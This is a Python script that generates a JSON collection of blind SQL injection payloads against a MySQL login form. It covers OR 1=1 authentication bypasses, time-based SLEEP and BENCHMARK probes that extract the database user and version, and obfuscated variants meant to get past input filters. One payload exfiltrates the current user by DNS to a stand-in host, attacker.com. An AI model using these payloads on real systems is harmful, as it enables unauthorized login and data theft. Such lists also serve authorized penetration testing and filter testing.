import json
import urllib.parse
from datetime import datetime

def double_url_encode(s):
    """Double URL encoding"""
    return urllib.parse.quote(urllib.parse.quote(s, safe=''), safe='')

def generate_payloads():
    payloads = {
        "boolean_true": [],
        "boolean_false": [],
        "time_based": [],
        "obfuscated": [],
        "metadata": {}
    }
    # BOOLEAN TRUE
    boolean_true_data = [
        ("admin' OR 1=1-- ", "OR 1=1 basic"),("' OR 1=1-- ", "OR 1=1 no username"),
        ("admin\" OR 1=1-- ", "OR 1=1 double quote"),("admin' OR 1=1#", "OR 1=1 hash"),
        ("admin' OR 1=1/*", "OR 1=1 block comment"),("admin' OR '1'='1'-- ", "String '1'='1'"),
        ('admin" OR "1"="1"-- ', 'String "1"="1"'),("admin' OR 'a'='a'-- ", "String 'a'='a'"),
        ("admin'OR 1=1-- ", "No space after quote"),("admin' OR(1=1)-- ", "Parentheses no space"),
        ("admin'/**/OR/**/1=1/**/--", "Block comment as space"),("admin'%09OR%091=1--%09", "Tab encoding"),
        ("admin'%0aOR%0a1=1--%0a", "Newline encoding"),("admin'%0bOR%0b1=1--%0b", "Vertical tab"),
        ("admin'%a0OR%a01=1--%a0", "Non-breaking space"),("admin'%2bOR%2b1=1--%2b", "Plus encoding"),
        ("admin' AND 1=1-- ", "AND 1=1 basic"),("admin' AND '1'='1'-- ", "AND string"),
        ("admin' OR 1=1 AND '1'='1'-- ", "OR and AND combo"),("admin' OR (1=1 AND 2=2)-- ", "Parentheses grouping"),
        ("admin' OR SUBSTR(user(),1,1)='r'-- ", "SUBSTR extraction"),("admin' OR SUBSTRING(user(),1,1)='r'-- ", "SUBSTRING"),
        ("admin' OR MID(user(),1,1)='r'-- ", "MID function"),("admin' OR LEFT(user(),1)='r'-- ", "LEFT function"),
        ("admin' OR RIGHT(user(),1)='t'-- ", "RIGHT function"),("admin' OR LENGTH(user())>0-- ", "LENGTH check"),
        ("admin' OR LENGTH(database())>0-- ", "DB length"),("admin' OR IF(1=1,1,0)-- ", "IF statement"),
        ("admin' OR IF(SUBSTR(@@version,1,1)='5',1,0)-- ", "Version IF"),("admin' OR CASE WHEN 1=1 THEN 1 ELSE 0 END-- ", "CASE statement"),
        ("admin' OR 0x31=0x31-- ", "Hex values"),("admin' OR UNHEX('31')=UNHEX('31')-- ", "UNHEX"),
        ("admin' OR CHAR(49)=CHAR(49)-- ", "CHAR function"),("admin' OR CHAR(97,100,109,105,110)='admin'-- ", "CHAR string"),
        ("admin' || 1=1-- ", "Double pipe OR"),("admin' OR 1 LIKE 1-- ", "LIKE operator"),
        ("admin' OR 1 IN (1)-- ", "IN operator"),("admin' OR 1 BETWEEN 0 AND 2-- ", "BETWEEN"),
        ("admin') OR 1=1-- ", "Close paren"),("admin') OR (1=1)-- ", "Parens wrapped"),
        ("admin')) OR 1=1-- ", "Double close paren"),("admin' OR %31=%31-- ", "URL encoded digits"),
        ("admin' OR %20%31%20=%20%31-- ", "URL encoded spaces"),("admin' OR%20(1)=%20(1)-- ", "URL parens"),
    ]
    for p,d in boolean_true_data:
        payloads["boolean_true"].append({"payload":p,"description":d,"technique":"boolean_true","detection":"Successful login/session"})
    
    # BOOLEAN FALSE (control)
    boolean_false_data = [
        ("admin' OR 1=0-- ", "OR 1=0"),("admin' OR '1'='0'-- ", "String false"),
        ("admin' OR 'a'='b'-- ", "String mismatch"),("admin' AND 1=0-- ", "AND 1=0"),
        ("admin' AND '1'='0'-- ", "AND false string"),("admin' OR 1=1 AND 1=0-- ", "True OR false AND"),
        ("admin' OR 1=0 AND 1=1-- ", "False AND true"),("admin' OR 1=2-- ", "OR 1=2"),
        ("admin' OR 2+2=5-- ", "Math false"),("admin' OR 'x' LIKE 'y'-- ", "LIKE false"),
    ]
    for p,d in boolean_false_data:
        payloads["boolean_false"].append({"payload":p,"description":d,"technique":"boolean_false","detection":"Login failure baseline"})
    
    # TIME-BASED
    time_data = [
        ("admin' OR SLEEP(5)-- ", "SLEEP 5s"),("admin' OR IF(1=1, SLEEP(5), 0)-- ", "IF SLEEP true"),
        ("admin' OR IF(1=0, SLEEP(5), 0)-- ", "IF SLEEP false"),("admin' AND SLEEP(5)-- ", "AND SLEEP"),
        ("admin' OR 1=1 AND SLEEP(5)-- ", "True with SLEEP"),("admin' OR BENCHMARK(1000000,MD5(1))-- ", "BENCHMARK MD5"),
        ("admin' OR IF(1=1, BENCHMARK(1000000,SHA1(1)), 0)-- ", "IF BENCHMARK"),("admin' OR BENCHMARK(5000000,RAND())-- ", "BENCHMARK RAND"),
        ("admin' OR GET_LOCK('test', 10)-- ", "GET_LOCK"),("admin' OR IF(IS_FREE_LOCK('test'), SLEEP(5), 0)-- ", "IS_FREE_LOCK"),
        ("admin' OR SLEEP(5) OR SLEEP(3)-- ", "Multiple SLEEP"),("admin' OR SLEEP(5) #", "SLEEP hash"),
        ("admin' OR IF(SUBSTR(user(),1,1)='r', SLEEP(5), 0)-- ", "Time extract username"),
        ("admin' OR IF(SUBSTR(@@version,1,1)='5', SLEEP(5), 0)-- ", "Time version"),
        ("admin' OR IF(LENGTH(database())>0, SLEEP(5), 0)-- ", "Time DB length"),
        ("admin' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)-- ", "CASE SLEEP"),
        ("admin' OR IF(ASCII(SUBSTR(user(),1,1))=114, SLEEP(5), 0)-- ", "ASCII time"),
        ("admin'OR(SLEEP(5))--", "No space SLEEP"),("admin'OR/**/SLEEP(5)/**/--", "Comment SLEEP"),
        ("admin' UNION SELECT SLEEP(5)-- ", "UNION SLEEP"),("admin'; SELECT SLEEP(5)-- ", "Stacked SLEEP"),
    ]
    for p,d in time_data:
        payloads["time_based"].append({"payload":p,"description":d,"technique":"time_based","detection":"Response delay 5s+"})
    
    # OBFUSCATED
    obf_data = [
        ("admin'%20OR%201=1--%20", "URL spaces"),("admin'%09OR%091=1--%09", "URL tabs"),
        ("admin'%0aOR%0a1=1--%0a", "URL newlines"),("admin'%0bOR%0b1=1--%0b", "URL vtabs"),
        ("admin'%a0OR%a01=1--%a0", "URL nbsp"),("admin'%2bOR%2b1=1--%2b", "URL plus"),
        (double_url_encode("admin' OR 1=1-- "), "Double URL OR"),(double_url_encode("admin' AND SLEEP(5)-- "), "Double URL SLEEP"),
        ("admin' /*!OR*/ 1=1--", "MySQL comment OR"),("admin' /*!50000OR*/ 1=1--", "Version comment"),
        ("admin' /*!12345UNION*/ SELECT 1--", "Comment UNION"),("admin'/*!--/*%%**OR***/1=1--", "Complex comment"),
        ("admin' OORR 1=1--", "Split OR"),("admin' SELSELECTECT 1--", "Split SELECT"),
        ("admin' UNUNIONION SELSELECTECT 1--", "Split UNION SELECT"),("admin' ANANDD 1=1--", "Split AND"),
        ("admin' OORR/**/1=1--", "Split comment"),("admin' OR CONCAT('a','d','m','i','n')='admin'-- ", "CONCAT"),
        ("admin' OR CHAR(97,100,109,105,110)='admin'--", "CHAR string"),("admin' OR 0x61646d696e='admin'--", "Hex string"),
        ("admin' OR%0d%0a1=1--", "CRLF"),("admin' OR%0c1=1--", "Form feed"),
        ("admin' OR/**//**/1=1--", "Multi comment"),("admin' OR/*test*/1=1--", "Text comment"),
        ("admin' || 1=1--", "Double pipe"),("admin' OR(1)>(0)--", "Compare"),
        ("admin' OR(1)LIKE(1)--", "LIKE as op"),("admin' OR(1)=(1)--", "Assignment"),
        ("admin' OR((1))=((1))--", "Double parens"),("admin' OR~0--", "Bitwise NOT"),
        ("admin' OR!0--", "Logical NOT"),("admin' /*!OR*/ /*!1*/=/*!1*/--", "Each commented"),
        ("admin' OR/**_**/1=1--", "Underscore comment"),("admin' OR%23%0a1=1--", "URL hash newline"),
        ("admin'; SELECT 1--", "Stacked query"),("admin' UNION SELECT 1,2,3--", "UNION"),
        ("admin' /*!UNION*/ /*!SELECT*/ 1,2--", "Commented UNION"),("admin' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--", "Subquery"),
        ("admin' OR (SELECT COUNT(*) FROM information_schema.tables)--", "Info schema"),
        ("admin' OR LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.attacker.com\\\\test'))--", "DNS exfil"),
    ]
    for p,d in obf_data:
        payloads["obfuscated"].append({"payload":p,"description":d,"technique":"obfuscation","detection":"Filter bypass"})
    
    # Totals
    total = len(payloads["boolean_true"]) + len(payloads["boolean_false"]) + len(payloads["time_based"]) + len(payloads["obfuscated"])
    payloads["metadata"] = {
        "total_payloads": total,
        "php_version": "5.6",
        "dbms": "MySQL",
        "generated_date": datetime.now().isoformat(),
        "categories": {
            "boolean_true": len(payloads["boolean_true"]),
            "boolean_false": len(payloads["boolean_false"]),
            "time_based": len(payloads["time_based"]),
            "obfuscated": len(payloads["obfuscated"])
        }
    }
    return payloads

# Generate and save
payload_data = generate_payloads()
filename = "blind_sql_injection_payloads.json"
with open(filename, 'w', encoding='utf-8') as f:
    json.dump(payload_data, f, indent=2, ensure_ascii=False)

# Display stats
print(f"[+] Total: {payload_data['metadata']['total_payloads']} payloads")
